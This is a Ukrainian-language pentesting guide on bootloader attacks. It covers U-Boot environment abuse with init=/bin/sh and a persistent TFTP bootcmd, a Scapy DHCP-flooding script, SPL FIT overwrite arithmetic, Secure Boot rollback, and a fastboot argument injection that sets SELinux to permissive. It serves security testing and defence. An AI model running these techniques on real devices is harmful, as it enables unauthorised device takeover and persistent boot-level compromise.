# Тестування bootloader

{{#include ../../banners/hacktricks-training.md}}

Для зміни конфігурацій запуску пристрою та тестування bootloader, як-от U-Boot і завантажувачів класу UEFI, рекомендовано виконати наведені нижче кроки. Зосередьтеся на отриманні виконання коду на ранньому етапі, оцінюванні захисту підпису та відкату, а також зловживанні шляхами відновлення або мережевого завантаження.

Пов’язана тема: обхід secure boot MediaTek за допомогою патчингу bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Швидкі способи отримати результат в U-Boot і зловживання середовищем

1. Отримайте доступ до shell інтерпретатора
   - Під час завантаження натисніть відому клавішу переривання (часто будь-яку клавішу, 0, пробіл або специфічну для плати «магічну» послідовність), перш ніж виконається `bootcmd`, щоб перейти до запрошення U-Boot.<sup>[[1]](#references)</sup>

2. Перевірте стан завантаження та змінні
   - Корисні команди:
     - `printenv` (вивести середовище)
     - `bdinfo` (інформація про плату, адреси пам’яті)
     - `help bootm; help booti; help bootz` (підтримувані методи завантаження ядра)
     - `help ext4load; help fatload; help tftpboot` (доступні завантажувачі)

3. Змініть аргументи завантаження, щоб отримати root shell
   - Додайте `init=/bin/sh`, щоб ядро відкривало shell замість звичайного init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Завантаження мережею з вашого TFTP-сервера
   - Налаштуйте мережу та завантажте образ ядра/FIT із локальної мережі:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Збережіть зміни через змінне середовище
   - Якщо сховище змінних середовища не захищене від запису, ви можете зберегти контроль:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Перевірте змінні на кшталт `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, які впливають на резервні шляхи. Неправильно налаштовані значення можуть дозволити багаторазово переходити до shell.

6. Перевірте налагоджувальні/небезпечні функції
   - Перевірте наявність: `bootdelay` > 0, вимкненого `autoboot`, необмеженої команди `usb start; fatload usb 0:1 ...`, можливості виконувати `loady`/`loads` через serial, імпорту `env import` із ненадійних носіїв і завантаження ядер/ramdisk без перевірки підписів.

7. Тестування образів U-Boot/перевірки
   - Якщо платформа заявляє про використання secure/verified boot з FIT-образами, спробуйте завантажити як непідписані, так і підмінені образи:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або застаріла поведінка `verify=n` часто дає змогу завантажувати довільні payload-и.
   - Не обмежуйтеся простим результатом allow/deny: нещодавнє дослідження FIT показало, що сам шлях перевірки може бути поверхнею атаки до автентифікації. Перевірте негативними тестами зовнішньо збережені дані FIT (`data-offset`, `data-position`, `data-size`), вибір підписаної конфігурації, обробку `loadables` і overlay / `extra-conf`.
   - Якщо у вас є відповідне дерево вихідного коду, `test/vboot/vboot_test.sh` — це швидкий спосіб відтворити поведінку перевірки FIT у U-Boot sandbox, перш ніж працювати з реальним обладнанням.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` і script bootflows
   - У сучасних збірках U-Boot `bootcmd` часто є лише обгорткою для Standard Boot. Це означає, що носії з можливістю запису, PXE або SPI flash можуть стати справжньою межею довіри, навіть якщо видиме середовище здається безпечним.
   - `extlinux` bootmeth шукає `extlinux/extlinux.conf` у `/` і `/boot`; script bootmeth спочатку шукає `boot.scr.uimg`, а потім `boot.scr`. Під час мережевого завантаження ім’я script-файлу може надходити з `boot_script_dhcp`.
   - Корисні команди для первинного аналізу:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Сценарії зловживання для тестування: USB/SD-носії, контрольовані зловмисником, які стоять раніше в `boot_targets`, доступний для запису `/boot/extlinux/extlinux.conf`, зловмисний TFTP-сервер, що надає `boot.scr`, або виконання скриптів із SPI через `script_offset_f`.
   - Якщо платформа покладається на перевірку FIT, переконайтеся, що конфігурації підписані на рівні конфігурації, а не лише для кожного образу окремо; `required-mode=all` надійніший, ніж прийняття будь-якого одного обов’язкового ключа.

### Зовнішні дані FIT у SPL копіюються до перевірки

Під час завантаження FIT у SPL цілісний підпис конфігурації не робить метадані зовнішніх даних безпечними. U-Boot виключає `data-position`, `data-offset` і `data-size` із підписаних властивостей конфігурації. У вразливих шляхах `load_simple_fit()` SPL визначає з цих полів вихідне зміщення та довжину копіювання, а потім викликає `info->read()` **до** перевірки хешу образу. Тому FIT, сформований зловмисником на доступному для запису завантажувальному носії, може перезаписати RAM без підроблення підпису. Підписана властивість `load` зазвичай фіксує адресу призначення, тому спершу з’ясуйте, чи може надмірно велике копіювання з цієї адреси дістатися до stack або інших керувальних даних.<sup>[[15]](#references)[[16]](#references)</sup>

Дослідіть фактичний завантажувач і карту пам’яті плати, а не припускайте, що читання відбувається з flash: продемонстрований RAM-завантажувач дійшов до `spl_ram_load_read()` і `memcpy()`. У місці виклику зафіксуйте `fit_offset` і будь-яку базову адресу FIT, яку додає reader, довжину блоку завантажувача (`spl_get_bl_len(info)`), вирівнювання, специфічне для форка, отримані `read_offset` і розмір передачі `size`, адресу призначення `src_ptr` та розташування збереженої адреси повернення. Перевірте, чи охоплює суміжна відображена область джерела потрібну відстань копіювання, чи перетинається вона з адресою призначення та чи можуть байти у вихідній позиції містити вказівник на дані FIT, контрольовані зловмисником. Якщо повний вказівник не відповідає обмеженням вирівнювання завантажувача, можна застосувати загальну техніку [partial return-address overwrite technique](../../binary-exploitation/stack-overflow/ret2win/).<sup>[[16]](#references)</sup>

У тестовій збірці 32-бітної AST2600 дослідників `src_ptr` мав значення `0x80001000`, а збережена адреса повернення для `memcpy` розташовувалася за адресою `0x902ffe24`. Вони використали upstream-збірку, змінену відповідно до розміщення stack і допоміжних засобів вирівнювання OpenBMC: RAM-reader додавав базову адресу FIT `0x10000`, а ці допоміжні засоби округлювали вихідне зміщення донизу до `ARCH_DMA_MINALIGN` (64 байти). Корисний little-endian вказівник за адресою `0x902fffe4` і копіювання, що завершувалося на один байт раніше, змінювали лише три молодші байти збереженої адреси повернення, зберігаючи її відомий нульовий старший байт. Натомість upstream RAM-завантажувач використовує довжину блоку в один байт, тому це вирівнювання на 64 байти та обхідний прийом із частковим перезаписом не є загальними вимогами SPL. Для кожної збірки заново обчислюйте адреси, довжину блоку завантажувача та обсяг копіювання. У початковому обчисленні нижче `fit_offset` позначає ефективне базове зміщення FIT, яке додає RAM-reader, а не обов’язково аргумент, переданий у `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Виправлення upstream обмежує і вихідний `data-size`, і **вирівняний за блоками** розмір передавання перед `info->read()`. Шлях overlay передає фактичну місткість буфера, тоді як інші виклики використовують `CONFIG_SYS_BOOTM_LEN` — це лише приблизна верхня межа, а не підтвердження, що в області призначення стільки вільної пам’яті. Аналізуючи форк виробника, перевірте наявність цих перевірок і порівняйте дозволений діапазон копіювання з реальним стеком SPL плати та зарезервованими областями.<sup>[[15]](#references)[[16]](#references)</sup>

## Поверхня мережевого завантаження (DHCP/PXE) та шахрайські сервери

9. Fuzzing параметрів PXE/DHCP
   - У застарілому коді U-Boot для обробки BOOTP/DHCP траплялися проблеми з безпекою пам’яті. Наприклад, CVE‑2024‑42040 описує розкриття пам’яті через спеціально сформовані відповіді DHCP, які можуть витікати байтами з пам’яті U-Boot у мережу.<sup>[[4]](#references)</sup> Перевірте шляхи обробки DHCP/PXE за допомогою надмірно довгих і граничних значень (bootfile-name параметра 67, параметри виробника, поля file/servername) та стежте за зависаннями/витоками.
   - Мінімальний фрагмент Scapy для стресового тестування параметрів завантаження через мережу:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Також перевірте, чи передаються поля імені файлу PXE до логіки оболонки/завантажувача без санітизації, коли вони використовуються в скриптах підготовки ОС.

10. Тестування ін’єкції команд через шахрайський DHCP-сервер
   - Налаштуйте шахрайську службу DHCP/PXE та спробуйте ін’єктувати символи в поля імені файлу або параметрів, щоб на наступних етапах ланцюжка завантаження передати їх інтерпретаторам команд. Для цього добре підійдуть допоміжний модуль DHCP у Metasploit, `dnsmasq` або власні скрипти Scapy. Спершу ізолюйте лабораторну мережу.

## Режими відновлення SoC ROM, що перевизначають звичайне завантаження

Багато SoC мають режим «loader» BootROM, який приймає код через USB/UART навіть за недійсних образів у flash-пам’яті. Якщо fuse-біти secure boot не запрограмовані, це може забезпечити довільне виконання коду на дуже ранньому етапі ланцюжка.

- NXP i.MX (Serial Download Mode)
  - Інструменти: `uuu` (mfgtools3) або `imx-usb-loader`.
  - Приклад: `imx-usb-loader u-boot.imx` — завантажити й запустити власний U-Boot з RAM.
- Allwinner (FEL)
  - Інструмент: `sunxi-fel`.
  - Приклад: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` або `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Інструмент: `rkdeveloptool`.
  - Приклад: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` — завантажити loader і власний U-Boot.

З’ясуйте, чи запрограмовані eFuse/OTP для secure boot на пристрої. Якщо ні, режими завантаження BootROM часто дають змогу обійти будь-яку перевірку на вищих рівнях (U-Boot, ядро, rootfs), безпосередньо виконавши ваш payload першого етапу з SRAM/DRAM.

## Завантажувачі UEFI/класу ПК: швидкі перевірки

11. Тестування підміни ESP, відкату та реєстрації ключів
   - Підключіть EFI System Partition (ESP) і перевірте наявність компонентів завантажувача: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, шляхів до логотипів виробника.
   - За можливості зчитайте стан Secure Boot і бази даних ключів з ОС:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Якщо платформа перебуває в Setup Mode, приймає реєстрацію ключів без автентифікації або постачається з тестовим/стандартним Platform Key (клас PKfail), локальний адміністратор або фізичний зловмисник може зареєструвати власні KEK/db і залишити Secure Boot «увімкненим», водночас завантажуючи довільні EFI-бінарні файли.<sup>[[3]](#references)</sup>
   - Спробуйте завантажитися зі зниженими версіями або відомими вразливими підписаними компонентами завантаження, якщо записи відкликання Secure Boot (dbx) не оновлені. Якщо платформа й далі довіряє старим shim/bootmanager, часто можна завантажити власне ядро або `grub.cfg` з ESP і отримати закріплення.
   - У Windows навіть пропатчені хости можуть приймати вразливі підписані bootmanager, якщо підписувач `Microsoft Windows Production PCA 2011` відсутній у прошивці `dbx`, як спостерігалося у випадку BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Обхід у стилі Baton Drop може зареєструвати MOK зловмисника; під час наступних завантажень легітимний shim може завантажити EFI-пayload, підписаний цим ключем.<sup>[[12]](#references)[[13]](#references)</sup> Пізніше відкликання старого підписувача Windows не видаляє зареєстрований MOK, тому шлях через shim може залишатися доступним, якщо цьому shim і далі довіряють.<sup>[[12]](#references)</sup>
   - Перш ніж тестувати цей шлях відкату на авторизованій UEFI-машині, перевірте **фактичний стан відкликань у прошивці**, а не лише історію оновлень Windows.<sup>[[13]](#references)[[14]](#references)</sup> Для перевірки наявності підписувача 2011 року в `dbx` Microsoft надає таку команду PowerShell лише для читання з підвищеними привілеями:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` — це лише зачіпка: у лабораторії з можливістю відновлення підтвердьте конкретний підписаний компонент завантаження та інші відкликання.<sup>[[12]](#references)[[14]](#references)</sup> Очікуване оновлення реєстру або прострочений сертифікат підпису не є еквівалентом завершеного відкликання через `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Перевірка застарілих відкликань shim / SBAT / dbx
   - Старі shim, підписані Microsoft, і форки виробників усе ще можуть слугувати шляхом для bootkit у стилі BYOVD, якщо відкликання застаріли. В ізольованій лабораторії розмістіть історично вразливий shim на ESP і спробуйте завантажити ланцюжком власний `grubx64.efi` або ядро.<sup>[[11]](#references)</sup>
   - Швидке сортування:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Якщо shim усе ще запускається, попри те, що він є в списку відкликаних, у firmware/OS застарілі оновлення `dbx` або вона довіряє форкнутому loader, який не успадкував upstream-захисти SBAT.

13. Помилки розбору логотипів завантаження (клас LogoFAIL)
   - У firmware кількох OEM/IBV виявлено вразливості до помилок розбору зображень у DXE під час обробки логотипів завантаження. Якщо зловмисник може розмістити підготовлене зображення на ESP за шляхом, специфічним для виробника (наприклад, `\EFI\<vendor>\logo\*.bmp`), і перезавантажити пристрій, може стати можливим виконання коду на ранньому етапі завантаження навіть за ввімкненого Secure Boot. Перевірте, чи платформа приймає логотипи, надані користувачем, і чи доступні ці шляхи для запису з OS.<sup>[[2]](#references)</sup>


## Прогалини довіри в Android/Qualcomm ABL + GBL (Android 16)

На пристроях з Android 16, де Qualcomm ABL завантажує **Generic Bootloader Library (GBL)**, перевірте, чи ABL **автентифікує** UEFI app, яку він завантажує з розділу `efisp`. Якщо ABL лише перевіряє **наявність** UEFI app і не перевіряє підписи, примітив запису в `efisp` дає змогу виконувати **непідписаний код до запуску OS** під час завантаження.<sup>[[6]](#references)[[7]](#references)</sup>

Практичні перевірки та шляхи зловживання:

- **Примітив запису в efisp**: Потрібен спосіб записати власну UEFI app у `efisp` (root/привілейована служба, помилка в OEM app, шлях через recovery/fastboot). Без цього прогалина в завантаженні GBL безпосередньо недосяжна.<sup>[[6]](#references)</sup>
- **Ін’єкція аргументів fastboot OEM** (помилка ABL): Деякі збірки приймають додаткові токени в `fastboot oem set-gpu-preemption` і додають їх до командного рядка ядра. Це можна використати, щоб увімкнути permissive SELinux і отримати змогу записувати в захищені розділи:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Якщо пристрій пропатчено, команда має відхиляти додаткові аргументи.<sup>[[5]](#references)[[6]](#references)</sup>
- **Розблокування bootloader через persistent flags**: payload на етапі завантаження може змінити persistent-прапорці розблокування (наприклад, `is_unlocked=1`, `is_unlocked_critical=1`), емулюючи `fastboot oem unlock` без перевірок OEM-сервера/схвалення. Це забезпечує довготривалу зміну стану після наступного перезавантаження.<sup>[[6]](#references)</sup>

Нотатки для захисту та первинного аналізу:

- Перевірте, чи ABL виконує перевірку підпису для payload GBL/UEFI з `efisp`. Якщо ні, вважайте `efisp` поверхнею persistence високого ризику.
- Відстежуйте, чи пропатчені обробники ABL fastboot OEM, щоб **перевіряти кількість аргументів** і відхиляти додаткові токени.<sup>[[8]](#references)[[9]](#references)</sup>

## Застереження щодо обладнання

Будьте обережні під час взаємодії з флеш-пам’яттю SPI/NAND на ранніх етапах завантаження (наприклад, заземлення контактів для обходу читання) і завжди звіряйтеся з технічним описом флеш-пам’яті. Невчасне замикання контактів може пошкодити пристрій або програматор.

## Нотатки й додаткові поради

- Спробуйте `env export -t ${loadaddr}` і `env import -t ${loadaddr}`, щоб переносити blobs середовища між RAM і сховищем; деякі платформи дозволяють імпортувати середовище зі знімного носія без автентифікації.
- Для persistence у системах на базі Linux, що завантажуються через `extlinux.conf`, часто достатньо змінити рядок `APPEND` (додати `init=/bin/sh` або `rd.break`) у завантажувальному розділі, якщо перевірки підпису не виконуються.
- Якщо ціль використовує оновлення з двома слотами / A/B, перегляньте методи обходу anti-rollback і розсинхронізації слотів в [огляді аналізу firmware](README.md), щоб не пропустити прогалини довіри, наявні лише в засобі оновлення, поза межами самого bootloader.
- Якщо userland надає `fw_printenv/fw_setenv`, перевірте, чи відповідає `/etc/fw_env.config` фактичному сховищу env. Неправильно налаштовані зміщення дають змогу читати/записувати не той регіон MTD.

## References

- [1] [Методологія тестування безпеки firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Виявлення LogoFAIL: небезпека обробки зображень під час завантаження системи](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: недовірені ключі платформи підривають безпеку Secure Boot в екосистемі UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Деталі CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Випереджені: розблокування Xiaomi через два несанітизовані рядки](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Експлойт Qualcomm Snapdragon 8 Elite GBL дає зловмисникам змогу розблокувати bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Архітектура Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: виправлено передавання недовірених даних у командний рядок ядра](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: додано перевірку команди set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Непридатний до завантаження: обхід перевірки підпису FIT в U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Повідомлення про вразливість VU#616257 — завантажувачі shim для UEFI, підписані Microsoft, вразливі до обходу Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit BlackLotus: міф підтверджено](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit, подібний до BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Як керувати відкликаннями Windows Boot Manager для змін Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Патч U-Boot: обмежено розмір зовнішніх даних перед їх читанням](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Приховані переваги FIT: обхід перевірки підпису в U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
